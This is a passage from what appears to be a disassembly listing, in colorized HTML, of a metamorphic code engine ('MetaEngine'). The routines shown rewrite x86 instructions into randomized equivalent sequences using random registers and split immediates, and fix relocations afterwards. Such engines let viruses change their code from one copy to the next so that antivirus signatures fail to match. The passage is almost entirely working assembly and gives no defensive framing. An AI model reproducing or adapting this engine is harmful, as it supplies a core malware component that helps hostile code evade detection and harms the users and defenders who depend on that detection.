                <span style="COLOR: #c0c0c0">mov     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">84h</span>                   <span style="COLOR: white">; bh = TEST r/m8, r8
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">__jmp_Mutate</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">SaveOpcodeField</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+4D9j
</span>                <span style="COLOR: #c0c0c0">mov     bh</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; bh = ModRM of 80h
</span>                <span style="COLOR: #c0c0c0">and     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; save [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">__jmp_Mutate</span>        <span style="COLOR: white">; mutate
</span><span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">SaveMovImm8Opcode</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+4DEj
</span>                <span style="COLOR: #c0c0c0">mov     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">88h</span>                   <span style="COLOR: white">; bh = MOV r/m8, r8
</span>
<span style="COLOR: #ffff00">__jmp_Mutate</span><span style="COLOR: #c0c0c0">:                                     </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+4E7j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+4EFj
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">Morph4</span>                    <span style="COLOR: white">; mutate
</span><span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">Change8bitTo32bit</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+4E3j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">83h</span>                   <span style="COLOR: white">; OP r/m32, imm8?
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">AbortEngine</span>
                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">81h</span>                   <span style="COLOR: white">; OP r/m32, imm32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">CheckDisplacement</span>         <span style="COLOR: #c0c0c0">; returns cl: 0, 1 or 4
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                    <span style="COLOR: white">; increase code pointer by 2
</span>                <span style="COLOR: #c0c0c0">rep movsb                         </span><span style="COLOR: white">; copy displacement
</span>                <span style="COLOR: #c0c0c0">lodsb                             </span><span style="COLOR: white">; load one byte
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">InvertSign</span>
                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">FixRelocations</span><span style="COLOR: #c0c0c0">:                                   </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+43j
</span>                <span style="COLOR: #c0c0c0">mov     ebx</span><span style="COLOR: #c0c0c0">, edi</span>
                <span style="COLOR: #c0c0c0">sub     ebx</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">outBuf</span><span style="COLOR: #c0c0c0">]</span>         <span style="COLOR: white">; ebx = size of output buffer
</span>                <span style="COLOR: #c0c0c0">mov     esi</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">RelocStart</span><span style="COLOR: #c0c0c0">]</span>     <span style="COLOR: white">; esi = beginning of relocation table
</span>
<span style="COLOR: #ffff00">AnalyzeCurrentEntry</span><span style="COLOR: #c0c0c0">:                              </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+52Fj
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+555j
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">10h</span>                  <span style="COLOR: white">; esi += 16
</span>                <span style="COLOR: #c0c0c0">cmp     esi</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">RelocCurrent</span><span style="COLOR: #c0c0c0">]</span>   <span style="COLOR: white">; are we finished?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">ReturnSuccess</span>
                <span style="COLOR: #c0c0c0">mov     edi</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">8</span><span style="COLOR: #c0c0c0">]</span>              <span style="COLOR: white">; Pointer to offset of New Relative
</span>                <span style="COLOR: #c0c0c0">cmp     edi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                    <span style="COLOR: white">; is it blank?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">AnalyzeCurrentEntry</span> <span style="COLOR: white">; process next instruction
</span>                <span style="COLOR: #c0c0c0">mov     edx</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">0Ch</span><span style="COLOR: #c0c0c0">]</span>            <span style="COLOR: white">; get New Relative Value
</span>                <span style="COLOR: #c0c0c0">add     edx</span><span style="COLOR: #c0c0c0">, [esi]</span>                <span style="COLOR: white">; edx = InputIP + NewRelative
</span>                <span style="COLOR: #c0c0c0">mov     ecx</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">RelocStart</span><span style="COLOR: #c0c0c0">]</span>     <span style="COLOR: white">; ecx = pointer to disassembled code
</span>                <span style="COLOR: #c0c0c0">sub     ecx</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">10h</span>                  <span style="COLOR: white">; ecx -= 16 (for inter-loop reasons)
</span>
<span style="COLOR: #ffff00">NextEntry</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+54Aj
</span>                <span style="COLOR: #c0c0c0">add     ecx</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">10h</span>                  <span style="COLOR: white">; check next entry
</span>                <span style="COLOR: #c0c0c0">cmp     ecx</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">RelocCurrent</span><span style="COLOR: #c0c0c0">]</span>   <span style="COLOR: white">; are we done?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">LoopOverFirstEntry</span>  <span style="COLOR: white">; no, proceed to loop over 1st field entries
</span>                <span style="COLOR: #c0c0c0">mov     ecx</span><span style="COLOR: #c0c0c0">, [esi]</span>                <span style="COLOR: white">; Save the InputIP
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">ReturnZero</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">LoopOverFirstEntry</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+542j
</span>                <span style="COLOR: #c0c0c0">cmp     [ecx]</span><span style="COLOR: #c0c0c0">, edx</span>                <span style="COLOR: white">;  edx = InputIP + NewRelative
</span>                                                  <span style="COLOR: white">; *ecx = InputIP
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">NextEntry</span>
                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, [ecx+</span><span style="COLOR: #00ffff">4</span><span style="COLOR: #c0c0c0">]</span>              <span style="COLOR: white">; eax = OutputIP
</span>                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, edi</span>                  <span style="COLOR: white">; eax = OutputIP -
</span>                                                  <span style="COLOR: white">;       OffsetNewNewRelative
</span>                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                    <span style="COLOR: white">; eax -= 4, due to earlier calculations
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store NewRelative in OffsetNewRelative
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">AnalyzeCurrentEntry</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">ReturnSuccess</span><span style="COLOR: #c0c0c0">:                                    </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+527j
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, ebx</span>                  <span style="COLOR: white">; eax = size of buffer
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">FreeMemory</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">AbortEngine</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+14Bj
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+154j ...
</span>                <span style="COLOR: #c0c0c0">mov     ecx</span><span style="COLOR: #c0c0c0">, esi</span>                  <span style="COLOR: white">; ecx = pointer to code
</span>
<span style="COLOR: #ffff00">ReturnZero</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+546j
</span>                <span style="COLOR: #c0c0c0">xor     eax</span><span style="COLOR: #c0c0c0">, eax</span>                  <span style="COLOR: white">; eax = 0
</span>
<span style="COLOR: #ffff00">FreeMemory</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+559j
</span>                <span style="COLOR: #c0c0c0">push    eax</span>                       <span style="COLOR: white">; save return value
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">RelocStart</span><span style="COLOR: #c0c0c0">]</span>     <span style="COLOR: white">; eax = start of disassembly buffer
</span>                <span style="COLOR: #c0c0c0">push    eax</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">callVirtualFree</span>           <span style="COLOR: white">; free memory
</span>                <span style="COLOR: #c0c0c0">pop     eax</span>                       <span style="COLOR: white">; restore return value
</span>                <span style="COLOR: #c0c0c0">pop     edi</span>
                <span style="COLOR: #c0c0c0">pop     esi</span>                       <span style="COLOR: white">; restore registers
</span>                <span style="COLOR: #c0c0c0">pop     ebx</span>
                <span style="COLOR: #c0c0c0">add     esp</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8</span>
                <span style="COLOR: #c0c0c0">pop     ebp</span>
                <span style="COLOR: #c0c0c0">nop
</span>                <span style="COLOR: #c0c0c0">retn    </span><span style="COLOR: #00ffff">0Ch</span>
<span style="COLOR: #ffff00">MetaEngine      endp
</span>

<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; returns random eax (0 to 7)
</span>
<span style="COLOR: #ffff00">Rnd7            proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+77p
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine:Mutate?p ...
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>
                <span style="COLOR: #c0c0c0">and     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>
                <span style="COLOR: #c0c0c0">cmp     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>
                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">Rnd7            endp
</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span><span style="COLOR: #c0c0c0">; START OF FUNCTION CHUNK FOR MetaEngine
</span>
<span style="COLOR: #ffff00">StoreDisplacementPlus2</span><span style="COLOR: #c0c0c0">:                           </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+22Bj
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+27Aj ...
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">CheckDisplacement</span>         <span style="COLOR: #c0c0c0">; returns cl: 0, 1 or 4
</span>                <span style="COLOR: #c0c0c0">add     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                     <span style="COLOR: white">; 2 more bytes
</span>
<span style="COLOR: #ffff00">StoreBytes</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+18Ej
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+1AEj ...
</span>                <span style="COLOR: #c0c0c0">and     ecx</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0FFh</span>                 <span style="COLOR: white">; and the cl bits
</span>                <span style="COLOR: #c0c0c0">rep movsb                         </span><span style="COLOR: white">; write until cl = 0
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; END OF FUNCTION CHUNK FOR MetaEngine
</span>
<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; returns cl: 0, 1 or 4
</span>
<span style="COLOR: #ffff00">CheckDisplacement proc near                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+2CCp
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+503p ...
</span>                <span style="COLOR: #c0c0c0">xor     ecx</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; ecx = 0
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; cl = ModRM
</span>                <span style="COLOR: #c0c0c0">and     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>
                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; [mod] == 00?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">ret_CheckDisplacement</span>
                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; [mod] == 11?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isMod01</span>
                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; no displacement
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">ret_CheckDisplacement</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isMod01</span><span style="COLOR: #c0c0c0">:                                          </span><span style="COLOR: #00ff00">; CODE XREF: CheckDisplacement+10j
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1000000b</span>              <span style="COLOR: white">; [mod] == 01?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">Mod10</span>
                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                     <span style="COLOR: white">; 1 byte displacement
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">ret_CheckDisplacement</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">Mod10</span><span style="COLOR: #c0c0c0">:                                            </span><span style="COLOR: #00ff00">; CODE XREF: CheckDisplacement+19j
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                     <span style="COLOR: white">; 4 bytes displacement
</span>
<span style="COLOR: #ffff00">ret_CheckDisplacement</span><span style="COLOR: #c0c0c0">:                            </span><span style="COLOR: #00ff00">; CODE XREF: CheckDisplacement+Bj
</span>                                                  <span style="COLOR: #00ff00">; CheckDisplacement+14j ...
</span>                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">CheckDisplacement endp
</span>

<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>

<span style="COLOR: #ffff00">InvertSign      proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+126p
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+3CBp ...
</span>                <span style="COLOR: #c0c0c0">push    ecx</span>
                <span style="COLOR: #c0c0c0">xor     ecx</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; ecx = 0
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>
                <span style="COLOR: #c0c0c0">jns     short </span><span style="COLOR: #ffff00">DontInvert</span>
                <span style="COLOR: #c0c0c0">sub     ecx</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>

<span style="COLOR: #ffff00">DontInvert</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: InvertSign+5j
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, al</span>
                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; return value in eax
</span>                <span style="COLOR: #c0c0c0">pop     ecx</span>
                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">InvertSign      endp
</span>

<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; returns a random dword in EAX
</span><span style="COLOR: #c0c0c0">; Attributes: bp-based frame
</span>
<span style="COLOR: #ffff00">GetRandomDword  proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+B5p
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+DAp ...
</span>                <span style="COLOR: #c0c0c0">push    ebp</span>
                <span style="COLOR: #c0c0c0">mov     ebp</span><span style="COLOR: #c0c0c0">, esp</span>
                <span style="COLOR: #c0c0c0">push    ecx</span>
                <span style="COLOR: #c0c0c0">push    edx</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>
                <span style="COLOR: #c0c0c0">mov     edx</span><span style="COLOR: #c0c0c0">, eax</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>
                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111b</span>
                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, al</span>
                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0FFFFFF00h</span>
                <span style="COLOR: #c0c0c0">rol     eax</span><span style="COLOR: #c0c0c0">, cl</span>
                <span style="COLOR: #c0c0c0">and     edx</span><span style="COLOR: #c0c0c0">, eax</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>
                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111b</span>
                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, al</span>
                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0FFFFFF00h</span>
                <span style="COLOR: #c0c0c0">rol     eax</span><span style="COLOR: #c0c0c0">, cl</span>
                <span style="COLOR: #c0c0c0">and     edx</span><span style="COLOR: #c0c0c0">, eax</span>
                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, edx</span>
                <span style="COLOR: #c0c0c0">pop     edx</span>
                <span style="COLOR: #c0c0c0">pop     ecx</span>
                <span style="COLOR: #c0c0c0">pop     ebp</span>
                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">GetRandomDword  endp
</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span><span style="COLOR: #c0c0c0">; START OF FUNCTION CHUNK FOR MetaEngine
</span>
<span style="COLOR: #ffff00">Morph1</span><span style="COLOR: #c0c0c0">:                                           </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+249j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+298j
</span>                <span style="COLOR: #c0c0c0">mov     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; if bh == 0, choose random reg
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetWBit</span>                   <span style="COLOR: #c0c0c0">; dl = *esi &amp; 1
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetRandomReg32</span>
                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>                   <span style="COLOR: white">; Generate PUSH RandomReg
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">89h</span>                   <span style="COLOR: white">; Generate MOV r/m32, r32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = original ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; save last 3 bits
</span>                <span style="COLOR: #c0c0c0">rol     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; place original register in the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; set [reg] field = radnom register
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = original ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">10000000b</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; if [mod] != 0
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">GenAddRandomReg32</span>
                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">2</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; cl = imm8
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">83h</span>                   <span style="COLOR: white">; al = OP r/m32, imm8
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; al = random reg
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11, [reg/opcode] = ADD
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; check the sign of CL
</span>                <span style="COLOR: #c0c0c0">js      short </span><span style="COLOR: #ffff00">GenSubRandomReg8</span>
                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">7Fh</span>                   <span style="COLOR: white">; set it between 0 - 7F
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">sub     cl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; cl -= radnom
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">GenOpRegRandomReg8</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">GenSubRandomReg8</span><span style="COLOR: #c0c0c0">:                                 </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+633j
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">101000b</span>               <span style="COLOR: white">; set [reg/opcode] field = 101 (SUB)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">7Fh</span>                   <span style="COLOR: white">; set it between 0 - 7F
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">add     cl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; cl += random
</span>
<span style="COLOR: #ffff00">GenOpRegRandomReg8</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+640j
</span>                <span style="COLOR: #c0c0c0">movsb                             </span><span style="COLOR: white">; copy original opcode byte
</span>                <span style="COLOR: #c0c0c0">lodsb                             </span><span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111000b</span>             <span style="COLOR: white">; save [mod] and [reg/opcode] fields
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; add random register
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; al = random number
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code counter
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">GenPopRandomReg</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">GenAddRandomReg32</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+624j
</span>                <span style="COLOR: #c0c0c0">mov     ecx</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">2</span><span style="COLOR: #c0c0c0">]</span>              <span style="COLOR: white">; ecx = imm32
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">81h</span>                   <span style="COLOR: white">; al = OP r/m32, imm32
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; al = random register
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11, [reg/opcode] = ADD
